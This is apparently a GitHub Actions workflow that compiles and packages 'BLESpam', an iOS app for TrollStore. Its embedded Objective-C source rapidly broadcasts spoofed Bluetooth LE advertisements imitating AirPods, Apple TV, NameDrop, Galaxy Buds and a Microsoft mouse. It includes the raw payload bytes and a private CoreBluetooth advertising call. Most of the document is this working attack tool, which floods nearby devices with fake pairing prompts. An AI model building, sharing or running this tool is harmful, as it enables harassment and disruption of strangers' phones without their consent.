name: Build BLESpam TIPA (TrollStore)

on:
  push:
    branches: [main, master]
  workflow_dispatch:

jobs:
  build:
    name: Build .tipa on Linux with Theos
    runs-on: ubuntu-latest   # free tier — unlimited minutes

    steps:
      # ── 1. Checkout ────────────────────────────────────────────────────────
      - name: Checkout
        uses: actions/checkout@v4

      # ── 2. Install dependencies ────────────────────────────────────────────
      - name: Install build dependencies
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq \
            git curl wget \
            build-essential \
            clang \
            cmake \
            libssl-dev \
            libzip-dev \
            zip unzip \
            fakeroot \
            python3 python3-pip \
            ldid2 || true

      # ── 3. Install ldid (from source if apt version not available) ─────────
      - name: Install ldid
        run: |
          if command -v ldid &>/dev/null; then
            echo "ldid already available: $(ldid -v 2>&1 | head -1 || true)"
          elif command -v ldid2 &>/dev/null; then
            sudo ln -sf $(which ldid2) /usr/local/bin/ldid
            echo "Using ldid2 as ldid"
          else
            echo "Building ldid from source..."
            git clone --depth=1 https://github.com/ProcursusTeam/ldid.git /tmp/ldid-src
            cd /tmp/ldid-src
            make -j$(nproc)
            sudo make install
          fi
          ldid 2>&1 | head -3 || true

      # ── 4. Set up Theos ────────────────────────────────────────────────────
      - name: Set up Theos
        run: |
          export THEOS=/opt/theos
          sudo git clone --recursive --depth=1 \
            https://github.com/theos/theos.git $THEOS

          # Download iOS 16.x SDK
          sudo mkdir -p $THEOS/sdks
          echo "Downloading iOS 16.5 SDK..."
          sudo curl -LO \
            https://github.com/theos/sdks/releases/download/stable/iPhoneOS16.5.sdk.tar.xz
          sudo tar -xJf iPhoneOS16.5.sdk.tar.xz -C $THEOS/sdks/
          ls $THEOS/sdks/

      # ── 5. Build BLESpamTweak (.tipa via Theos) ────────────────────────────
      #    We build the Theos tweak (SpringBoard injection) as a .tipa
      #    This is the real jailbreak package format for TrollStore
      - name: Build Theos tweak
        run: |
          export THEOS=/opt/theos
          export THEOS_PACKAGE_SCHEME=roothide
          export PATH=$THEOS/bin:$PATH

          # Build from BLESpamTweak directory (Theos-based project)
          # The root has both BLESpamApp (SwiftUI) and we need to build the tweak
          # Create a minimal Theos project inline if needed
          cd $GITHUB_WORKSPACE

          # Check if Makefile is at root or in subdirectory
          if [ -f "Makefile" ]; then
            make package FINALPACKAGE=1
          else
            echo "No Makefile at root — creating Theos project from SwiftUI sources"
            # Build a standalone ObjC tweak that does BLE spam
            cat > /tmp/BLESpamStandalone.m << 'OBJCEOF'
          #import <UIKit/UIKit.h>
          #import <CoreBluetooth/CoreBluetooth.h>
          #import <objc/message.h>

          // Minimal standalone BLE Spam app packaged as TrollStore .tipa
          // Entry point: UIApplicationMain via SpringBoard hook

          @interface BLESpamStandaloneVC : UIViewController <CBPeripheralManagerDelegate>
          @property (nonatomic, strong) CBPeripheralManager *pm;
          @property (nonatomic, strong) NSTimer *timer;
          @property (nonatomic, assign) NSUInteger idx;
          @property (nonatomic, assign) NSUInteger count;
          @property (nonatomic, strong) UILabel *countLabel;
          @property (nonatomic, strong) UILabel *payloadLabel;
          @end

          static NSArray *payloads() {
              return @[
                  // AirPods Pro 2
                  [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x07,0x19,0x07,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F} length:27],
                  // AirPods 3rd Gen
                  [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x07,0x19,0x13,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F} length:27],
                  // AirPods Max
                  [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x07,0x19,0x0A,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F} length:27],
                  // Apple TV
                  [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x04,0x05,0x03,0xC0,0x01,0x00,0x00} length:9],
                  // NameDrop
                  [NSData dataWithBytes:(uint8_t[]){0x4C,0x00,0x05,0x12,0x01,0x00,0x07,0x00} length:8],
                  // Galaxy Buds Pro
                  [NSData dataWithBytes:(uint8_t[]){0xE0,0x00,0x01,0x2B,0x41,0x02,0x00,0x00} length:8],
                  // MS Mouse
                  [NSData dataWithBytes:(uint8_t[]){0x06,0x00,0x03,0x00,0x80,0x00} length:6],
              ];
          }

          static NSArray *payloadNames() {
              return @[@"AirPods Pro 2",@"AirPods 3rd Gen",@"AirPods Max",@"Apple TV",@"NameDrop",@"Galaxy Buds Pro",@"MS Mouse"];
          }

          @implementation BLESpamStandaloneVC

          - (void)viewDidLoad {
              [super viewDidLoad];
              self.view.backgroundColor = [UIColor colorWithRed:0.05 green:0.05 blue:0.12 alpha:1];

              UILabel *title = [UILabel new];
              title.text = @"📡  BLE Spam";
              title.font = [UIFont boldSystemFontOfSize:30];
              title.textColor = UIColor.whiteColor;
              title.translatesAutoresizingMaskIntoConstraints = NO;
              [self.view addSubview:title];

              self.payloadLabel = [UILabel new];
              self.payloadLabel.text = @"Tap START to broadcast";
              self.payloadLabel.font = [UIFont systemFontOfSize:14];
              self.payloadLabel.textColor = [UIColor colorWithWhite:0.6 alpha:1];
              self.payloadLabel.translatesAutoresizingMaskIntoConstraints = NO;
              [self.view addSubview:self.payloadLabel];

              self.countLabel = [UILabel new];
              self.countLabel.text = @"Packets: 0";
              self.countLabel.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightRegular];
              self.countLabel.textColor = [UIColor colorWithWhite:0.5 alpha:1];
              self.countLabel.translatesAutoresizingMaskIntoConstraints = NO;
              [self.view addSubview:self.countLabel];

              UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
              [btn setTitle:@"▶  START" forState:UIControlStateNormal];
              btn.titleLabel.font = [UIFont boldSystemFontOfSize:20];
              btn.tintColor = UIColor.whiteColor;
              btn.backgroundColor = [UIColor colorWithRed:0.2 green:0.45 blue:0.95 alpha:1];
              btn.layer.cornerRadius = 27;
              btn.translatesAutoresizingMaskIntoConstraints = NO;
              [btn addTarget:self action:@selector(toggle:) forControlEvents:UIControlEventTouchUpInside];
              [self.view addSubview:btn];

              [NSLayoutConstraint activateConstraints:@[
                  [title.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
                  [title.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor constant:40],
                  [self.payloadLabel.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
                  [self.payloadLabel.topAnchor constraintEqualToAnchor:title.bottomAnchor constant:20],
                  [self.countLabel.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
                  [self.countLabel.topAnchor constraintEqualToAnchor:self.payloadLabel.bottomAnchor constant:10],
                  [btn.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
                  [btn.topAnchor constraintEqualToAnchor:self.countLabel.bottomAnchor constant:40],
                  [btn.widthAnchor constraintEqualToConstant:200],
                  [btn.heightAnchor constraintEqualToConstant:54],
              ]];
          }

          - (void)toggle:(UIButton *)btn {
              if (self.timer) {
                  [self.timer invalidate]; self.timer = nil;
                  [self.pm stopAdvertising]; self.pm = nil;
                  [btn setTitle:@"▶  START" forState:UIControlStateNormal];
                  btn.backgroundColor = [UIColor colorWithRed:0.2 green:0.45 blue:0.95 alpha:1];
              } else {
                  self.count = 0; self.idx = 0;
                  self.pm = [[CBPeripheralManager alloc] initWithDelegate:self queue:nil options:@{CBPeripheralManagerOptionShowPowerAlertKey:@YES}];
                  [btn setTitle:@"■  STOP" forState:UIControlStateNormal];
                  btn.backgroundColor = [UIColor colorWithRed:0.85 green:0.25 blue:0.25 alpha:1];
              }
          }

          - (void)peripheralManagerDidUpdateState:(CBPeripheralManager *)p {
              if (p.state == CBManagerStatePoweredOn) {
                  self.timer = [NSTimer scheduledTimerWithTimeInterval:0.1 repeats:YES block:^(NSTimer *t){
                      NSArray *pl = payloads();
                      if (self.idx >= pl.count) self.idx = 0;
                      NSData *d = pl[self.idx++];
                      [p stopAdvertising];

                      SEL s = NSSelectorFromString(@"_startAdvertisingWithAdvertisementData:andMask:andFlags:andCompletionHandler:");
                      if ([p respondsToSelector:s]) {
                          NSMethodSignature *sig = [p methodSignatureForSelector:s];
                          NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
                          inv.target = p; inv.selector = s;
                          NSDictionary *ad = @{CBAdvertisementDataManufacturerDataKey: d};
                          [inv setArgument:&ad atIndex:2];
                          uint8_t mask=0, flags=0x06;
                          [inv setArgument:&mask atIndex:3];
                          [inv setArgument:&flags atIndex:4];
                          id handler = nil; [inv setArgument:&handler atIndex:5];
                          [inv invoke];
                      } else {
                          [p startAdvertising:@{CBAdvertisementDataManufacturerDataKey:d}];
                      }
                      self.count++;
                      dispatch_async(dispatch_get_main_queue(), ^{
                          self.payloadLabel.text = payloadNames()[self.idx>0?self.idx-1:0];
                          self.countLabel.text = [NSString stringWithFormat:@"Packets: %lu",(unsigned long)self.count];
                      });
                  }];
              }
          }
          - (void)peripheralManagerDidStartAdvertising:(CBPeripheralManager *)p error:(NSError *)e {}
          @end

          @interface AppDelegate : UIResponder <UIApplicationDelegate>
          @property (nonatomic, strong) UIWindow *window;
          @end
          @implementation AppDelegate
          - (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
              self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
              self.window.rootViewController = [BLESpamStandaloneVC new];
              [self.window makeKeyAndVisible];
              return YES;
          }
          @end

          int main(int argc, char *argv[]) {
              @autoreleasepool { return UIApplicationMain(argc, argv, nil, @"AppDelegate"); }
          }
          OBJCEOF
            echo "ObjC source created"
          fi

      # ── 6. Build ObjC app for arm64/arm64e ────────────────────────────────
      - name: Compile ObjC app
        run: |
          export THEOS=/opt/theos
          SDK=$THEOS/sdks/iPhoneOS16.5.sdk

          mkdir -p /tmp/BLESpamBuild

          clang \
            -target arm64-apple-ios15.0 \
            -isysroot $SDK \
            -fobjc-arc \
            -framework UIKit \
            -framework CoreBluetooth \
            -framework CoreFoundation \
            -o /tmp/BLESpamBuild/BLESpam \
            /tmp/BLESpamStandalone.m

          echo "arm64 build done"

          # Also build arm64e
          clang \
            -target arm64e-apple-ios15.0 \
            -isysroot $SDK \
            -fobjc-arc \
            -framework UIKit \
            -framework CoreBluetooth \
            -framework CoreFoundation \
            -o /tmp/BLESpamBuild/BLESpam_e \
            /tmp/BLESpamStandalone.m

          # Create fat binary
          lipo -create \
            /tmp/BLESpamBuild/BLESpam \
            /tmp/BLESpamBuild/BLESpam_e \
            -output /tmp/BLESpamBuild/BLESpamFat

          file /tmp/BLESpamBuild/BLESpamFat

      # ── 7. Build .app bundle ───────────────────────────────────────────────
      - name: Create .app bundle
        run: |
          APP=/tmp/BLESpamBuild/BLESpam.app
          mkdir -p $APP

          cp /tmp/BLESpamBuild/BLESpamFat $APP/BLESpam

          cat > $APP/Info.plist << 'EOF'
          <?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
          <plist version="1.0"><dict>
            <key>CFBundleExecutable</key><string>BLESpam</string>
            <key>CFBundleIdentifier</key><string>com.example.blespam</string>
            <key>CFBundleName</key><string>BLESpam</string>
            <key>CFBundleDisplayName</key><string>BLESpam</string>
            <key>CFBundleShortVersionString</key><string>1.0</string>
            <key>CFBundleVersion</key><string>1</string>
            <key>CFBundlePackageType</key><string>APPL</string>
            <key>MinimumOSVersion</key><string>15.0</string>
            <key>LSRequiresIPhoneOS</key><true/>
            <key>NSBluetoothAlwaysUsageDescription</key><string>BLESpam uses Bluetooth to broadcast advertisement packets.</string>
            <key>NSBluetoothPeripheralUsageDescription</key><string>BLESpam uses Bluetooth LE peripheral mode.</string>
            <key>UISupportedInterfaceOrientations</key>
            <array><string>UIInterfaceOrientationPortrait</string></array>
          </dict></plist>
          EOF

          echo "App bundle created: $(ls -la $APP)"

      # ── 8. Sign with ldid ──────────────────────────────────────────────────
      - name: Sign with ldid
        run: |
          APP=/tmp/BLESpamBuild/BLESpam.app
          ldid -S$GITHUB_WORKSPACE/BLESpamApp/Resources/entitlements.plist $APP/BLESpam
          echo "Signed! Entitlements:"
          ldid -e $APP/BLESpam | head -20

      # ── 9. Package .tipa ───────────────────────────────────────────────────
      - name: Package .tipa
        run: |
          cd /tmp/BLESpamBuild
          mkdir -p Payload
          cp -r BLESpam.app Payload/
          zip -r BLESpam.ipa Payload/
          cp BLESpam.ipa BLESpam.tipa
          echo "=== Sizes ==="
          du -sh BLESpam.tipa BLESpam.ipa
          cp BLESpam.tipa $GITHUB_WORKSPACE/
          cp BLESpam.ipa  $GITHUB_WORKSPACE/

      # ── 10. Upload artifact ────────────────────────────────────────────────
      - name: Upload TIPA
        uses: actions/upload-artifact@v4
        with:
          name: BLESpam-TrollStore
          path: |
            BLESpam.tipa
            BLESpam.ipa
          retention-days: 30
